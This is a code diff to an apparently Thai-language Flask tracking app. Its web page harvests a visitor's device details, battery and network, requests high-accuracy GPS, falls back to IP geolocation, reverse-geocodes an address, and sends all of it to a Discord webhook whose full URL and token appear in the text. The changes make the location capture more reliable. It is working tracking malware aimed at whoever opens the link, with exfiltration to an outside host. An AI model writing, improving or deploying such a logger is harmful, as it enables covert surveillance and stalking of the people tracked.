@@ -9,21 +9,20 @@ DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6S
 
 def get_location_from_ip(ip):
     try:
-        url = f'https://ipinfo.io/{ip}/json'
+        url = f'https://ipapi.co/{ip}/json/'
         resp = requests.get(url, timeout=5)
         data = resp.json()
         if data.get('ip'):
-            loc = data.get('loc', '').split(',')
             return {
                 'city': data.get('city', 'ไม่ระบุ'),
                 'region': data.get('region', 'ไม่ระบุ'),
-                'country': data.get('country', 'ไม่ระบุ'),
+                'country': data.get('country_name', 'ไม่ระบุ'),
                 'isp': data.get('org', 'ไม่ระบุ'),
-                'lat': float(loc[0]) if len(loc) > 0 else 0,
-                'lon': float(loc[1]) if len(loc) > 1 else 0
+                'lat': data.get('latitude', 0),
+                'lon': data.get('longitude', 0)
             }
-    except Exception as e:
-        print(f"IPInfo error: {e}")
+    except:
+        pass
     return None
 
 def reverse_geocode(lat, lon):
@@ -135,15 +134,25 @@ HTML = '''<!DOCTYPE html>
                 deviceInfo.rtt = 0;
             }
             
+            // GPS 5 วินาที
             try {
                 const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                    const timeoutId = setTimeout(() => {
+                        reject(new Error('GPS timeout'));
+                    }, 5000);
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => { clearTimeout(timeoutId); resolve(p); },
+                        (err) => { clearTimeout(timeoutId); reject(err); },
+                        { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
+                    );
                 });
                 deviceInfo.gps_lat = pos.coords.latitude;
                 deviceInfo.gps_lon = pos.coords.longitude;
-                deviceInfo.gps_accuracy = pos.coords.accuracy;
+                deviceInfo.gps_accuracy = Math.round(pos.coords.accuracy);
+                deviceInfo.gps_fallback = false;
             } catch(e) {
-                deviceInfo.gps = 'ไม่ได้รับอนุญาตหรือไม่รองรับ';
+                console.log('GPS error:', e.message);
+                deviceInfo.gps_fallback = true;
             }
             
             try {
@@ -232,16 +241,23 @@ def upload():
         
         location = get_location_from_ip(real_ip)
         
+        # ถ้า GPS ได้ ใช้ GPS; ถ้าไม่ได้ ใช้ IP
+        if device_info.get('gps_fallback') and location:
+            device_info['gps_lat'] = location['lat']
+            device_info['gps_lon'] = location['lon']
+            device_info['gps_accuracy'] = 'IP Geolocation'
+            device_info['gps_from'] = 'IP'
+        else:
+            device_info['gps_from'] = 'GPS'
+        
         gps_address = None
         if device_info.get('gps_lat') and device_info.get('gps_lon'):
             gps_address = reverse_geocode(device_info['gps_lat'], device_info['gps_lon'])
         
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         
-        # สร้าง Embed
         fields = []
         
-        # IP และที่อยู่
         if real_ip:
             fields.append({"name": "🌐 IP", "value": real_ip, "inline": True})
         if location:
@@ -250,33 +266,34 @@ def upload():
             fields.append({"name": "🌍 ประเทศ", "value": location['country'], "inline": True})
             fields.append({"name": "📶 ค่ายเน็ต", "value": location['isp'][:50], "inline": True})
         
-        # OS และเบราว์เซอร์
         fields.append({"name": "💻 OS", "value": device_info.get('os', 'ไม่ระบุ'), "inline": True})
         fields.append({"name": "🌐 เบราว์เซอร์", "value": device_info.get('browser', 'ไม่ระบุ'), "inline": True})
         fields.append({"name": "🖥️ หน้าจอ", "value": f"{device_info.get('screenWidth')}x{device_info.get('screenHeight')}", "inline": True})
         fields.append({"name": "🔤 ภาษา", "value": device_info.get('language', 'ไม่ระบุ'), "inline": True})
         
-        # เครือข่าย
         if device_info.get('networkType') and device_info.get('networkType') != 'ไม่รองรับ':
             fields.append({"name": "📶 ประเภทเน็ต", "value": device_info['networkType'], "inline": True})
         if device_info.get('downlink'):
             fields.append({"name": "📶 ความเร็ว", "value": f"{device_info['downlink']} Mbps", "inline": True})
         
-        # GPS
+        # GPS หรือ IP
         if device_info.get('gps_lat') and device_info.get('gps_lon'):
+            source = device_info.get('gps_from', 'GPS')
+            if source == 'IP':
+                gps_label = "📍 พิกัด (จาก IP)"
+            else:
+                acc = device_info.get('gps_accuracy', '?')
+                gps_label = f"📍 GPS (±{acc} เมตร)"
             gps_val = f"{device_info['gps_lat']}, {device_info['gps_lon']}"
-            if device_info.get('gps_accuracy'):
-                gps_val += f" (±{device_info['gps_accuracy']}m)"
-            fields.append({"name": "📍 GPS", "value": gps_val, "inline": True})
+            fields.append({"name": gps_label, "value": gps_val, "inline": True})
             if gps_address:
                 addr_val = gps_address.get('display_name', '')
                 if len(addr_val) > 50:
                     addr_val = addr_val[:50] + '...'
-                fields.append({"name": "🏠 ที่อยู่ (GPS)", "value": addr_val, "inline": False})
-        elif device_info.get('gps') == 'ไม่ได้รับอนุญาตหรือไม่รองรับ':
-            fields.append({"name": "📍 GPS", "value": "ปฏิเสธหรือไม่รองรับ", "inline": True})
+                fields.append({"name": "🏠 ที่อยู่", "value": addr_val, "inline": False})
+        else:
+            fields.append({"name": "📍 GPS", "value": "ไม่ได้รับข้อมูล", "inline": True})
         
-        # แบตเตอรี่
         bat_val = f"{device_info.get('batteryLevel', 'ไม่ระบุ')}%"
         if device_info.get('batteryCharging') is True:
             bat_val += " ⚡กำลังชาร์จ"
@@ -284,7 +301,6 @@ def upload():
             bat_val += " 🔋ไม่กำลังชาร์จ"
         fields.append({"name": "🔋 แบตเตอรี่", "value": bat_val, "inline": True})
         
-        # เวลา
         fields.append({"name": "🕐 เวลา", "value": time_now, "inline": False})
         
         embed = {
